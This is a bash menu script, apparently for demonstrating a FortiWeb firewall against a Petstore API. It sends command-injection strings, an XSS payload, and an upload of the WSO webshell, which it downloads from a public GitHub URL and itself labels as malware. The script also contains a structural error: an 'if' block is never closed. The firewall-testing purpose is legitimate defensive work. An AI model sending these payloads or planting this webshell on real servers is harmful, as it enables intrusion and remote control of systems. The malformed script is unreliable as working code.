#!/bin/bash

PETSTORE_URL='http://petstore.corp.fabriclab.ca/api/v3'
#PETSTORE_URL='https://petstore.buonassera.fr/api/v3'

# wso.php is a backdoor/webshell and considered as a malware
wso_file="wso.php"
wso_url="https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php"

if [ ! -f "$wso_file" ]; then
    curl -O $wso_url

RED='\033[0;31m' # Red color code
GREEN='\033[0;32m' # Green color code
CYAN='\033[00;36m' # Cyan color code
NC='\033[0m' # No color

options=(
    "GET findByStatus?status=available                     - Normal Request"
    "GET findByStatus?status=sold                          - Normal Request"
    "GET findByStatus?status=pending                       - Normal Request"
    "GET findByStatus?                                     - Schema violation"
    "GET findByStatus?status=ABCDEFGHIJKL                  - URL too long"
    "GET findByStatus?status=A                             - URL too short"
    "GET findByStatus?status=;cmd.exe                      - Command Injection in URL"
    "POST {\"status\": \"/bin/ls\"}                            - Command Injection in JSON"
    "POST {\"status\": \"xx& var1=l var2=s;$var1$var2\"}                 - Zero-Day in JSON"
    "POST {\"status\": \"<script>alert(123)</script>\"}       - XSS in JSON"
    "POST {\"status\": \"*malware*\"}                         - Malware in JSON"
    "GET findByStatus?status=sold&status=pending          - Additional URL parameter"
    "GET accept: application/yaml                         - Non JSON request"
)


curl_commands=(
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?status=available' -H 'accept: application/json' -H 'content-type: application/json'"
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?status=sold' -H 'Accept: application/json' -H 'Content-Type: application/json'"
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?status=pending' -H 'Accept: application/json' -H 'Content-Type: application/json'"
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?' -H 'Accept: application/json' -H 'Content-Type: application/json'"
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?status=ABCDEFGHIJKL' -H 'Accept: application/json' -H 'Content-Type: application/json'"
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?status=A' -H 'Accept: application/json' -H 'Content-Type: application/json'"
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?status=;cmd.exe' -H 'Accept: application/json' -H 'Content-Type: application/json'"
    "curl -s -k -X 'POST' '${PETSTORE_URL}/pet' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{\"id\": 110, \"category\": {\"id\": 110, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 110, \"name\": \"FortiCamel\"}], \"status\": \"/bin/ls\"}'"
    "curl -s -k -X 'POST' '${PETSTORE_URL}/pet' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{\"id\": 111, \"category\": {\"id\": 111, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 111, \"name\": \"FortiCamel\"}], \"status\": \"xx& var1=l var2=s;$var1$var2\"}'"
    "curl -s -k -X 'POST' '${PETSTORE_URL}/pet' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{\"id\": 111, \"category\": {\"id\": 111, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 112, \"name\": \"FortiCamel\"}], \"status\": \"<script>alert(123)</script>\"}'"
    "curl -s -k -X POST '${PETSTORE_URL}/pet' -H 'accept: application/json' -F 'file=@wso.php;type=application/x-php' -F 'data={\"id\": 110, \"category\": {\"id\": 110, \"name\": \"Camel\"}, \"name\": \"FortiCamel\", \"photoUrls\": [\"photo.png\"], \"tags\": [ {\"id\": 113, \"name\": \"FortiCamel\"}], \"status\": \"sold\"};type=application/json'"
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?status=sold&status=pending' -H 'accept: application/json' -H 'Content-Type: application/json'"
    "curl -s -k -X 'GET' '${PETSTORE_URL}/pet/findByStatus?status=sold' -H 'accept: application/yaml' -H 'Content-Type: application/json'"
)


select_option() {
    clear
    echo "Choose an option:"
    echo ""
    for i in "${!options[@]}"; do
        echo "$((i+1)). ${options[$i]}"
    done
    echo ""
    read -p "Enter your choice (1-${#options[@]}): " choice
    if [[ ! "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#options[@]} )); then
        echo ""
        read -p "Invalid choice. Please try again. Press Enter to continue..."
        select_option
    fi
    execute_curl $((choice-1))
}

execute_curl() {
    local index=$1
    local command=${curl_commands[$index]}
    echo ""
    echo "Executing CURL command:"
    echo -e "${CYAN}$command${NC}"
    echo
    output=$(eval $command 2>&1)
    if [[ $? -eq 0 ]]; then
        # Connection successful
        echo "Response:"
        if [[ "$output" == "Request Blocked by FortiWeb!" ]]; then
            echo -e "${RED}$output${NC}"
        else
            echo -e "${GREEN}$output${NC}"
        fi
    else
        # Connection failed
        echo "Error message:"
        echo -e "${RED}$output${NC}"
    fi
    echo
    read -p "Press Enter to continue..."
    select_option
}

select_option



